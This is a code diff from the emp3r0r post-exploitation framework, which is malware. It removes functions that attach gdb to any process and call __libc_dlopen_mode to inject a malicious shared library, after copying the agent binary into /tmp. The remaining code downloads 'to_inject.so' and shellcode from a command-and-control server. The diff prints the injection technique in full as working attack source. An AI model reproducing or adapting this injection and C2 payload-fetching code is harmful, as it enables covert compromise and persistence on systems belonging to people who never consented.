@@ -7,82 +7,14 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"os/exec"
 	"runtime"
 	"strings"
-	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	exe_utils "github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
 	"github.com/jm33-m0/emp3r0r/core/lib/file"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
-
-// inject a shared library using dlopen
-func gdbInjectSharedLibWorker(path_to_so string, pid int) error {
-	gdb_path := RuntimeConfig.UtilsPath + "/gdb"
-	if !util.IsExist(gdb_path) {
-		res := VaccineHandler("") // NOTE deprecated, won't work due to lack of gdb
-		if !strings.Contains(res, "success") {
-			return fmt.Errorf("Download gdb via VaccineHandler: %s", res)
-		}
-	}
-
-	temp := "/tmp/emp3r0r"
-	if util.IsExist(temp) {
-		os.RemoveAll(temp) // ioutil.WriteFile returns "permission denied" when target file exists, can you believe that???
-	}
-	err := CopySelfTo(temp)
-	if err != nil {
-		return err
-	}
-	// cleanup
-	defer func() {
-		time.Sleep(3 * time.Second)
-		err = os.Remove("/tmp/emp3r0r")
-		if err != nil {
-			log.Printf("Delete /tmp/emp3r0r: %v", err)
-		}
-	}()
-
-	if pid == 0 {
-		cmd := exec.Command("sleep", "10")
-		err := cmd.Start()
-		if err != nil {
-			return err
-		}
-		pid = cmd.Process.Pid
-	}
-
-	gdb_cmd := fmt.Sprintf(`echo 'print __libc_dlopen_mode("%s", 2)' | %s -p %d`,
-		path_to_so,
-		gdb_path,
-		pid)
-	out, err := exec.Command("sh", "-c", gdb_cmd).CombinedOutput()
-	if err != nil {
-		return fmt.Errorf("%s: %s\n%v", gdb_cmd, out, err)
-	}
-
-	return nil
-}
-
-// Inject loader.so into any process
-func GDBInjectLoader(pid int) error {
-	so_path, err := prepare_loader_so(pid, "")
-	if err != nil {
-		return err
-	}
-	return gdbInjectSharedLibWorker(so_path, pid)
-}
-
-// Inject shared lib into any process
-func GDBInjectSharedLib(pid int) error {
-	so_path, err := prepare_shared_lib("") // NOTE: deprecated, won't work due to lack of gdb
-	if err != nil {
-		return err
-	}
-	return gdbInjectSharedLibWorker(so_path, pid)
-}
 
 // copy agent binary and loader.so to persistent location
 func prepare_loader_so(pid int, bin string) (so_path string, err error) {
@@ -151,7 +83,7 @@ func prepare_shared_lib(checksum string) (path string, err error) {
 	if !HasRoot() {
 		path = fmt.Sprintf("%s/%s", RuntimeConfig.UtilsPath, NameTheLibrary())
 	}
-	_, err = SmartDownload("to_inject.so", path, checksum)
+	_, err = SmartDownload("", "to_inject.so", path, checksum)
 	if err != nil {
 		err = fmt.Errorf("Failed to download to_inject.so from CC: %v", err)
 	}
@@ -160,7 +92,7 @@ func prepare_shared_lib(checksum string) (path string, err error) {
 
 // prepare the shellcode
 func prepare_sc(pid int, checksum string) (shellcode string, shellcodeLen int) {
-	sc, err := SmartDownload("shellcode.txt", "", checksum)
+	sc, err := SmartDownload("", "shellcode.txt", "", checksum)
 	if err != nil {
 		log.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
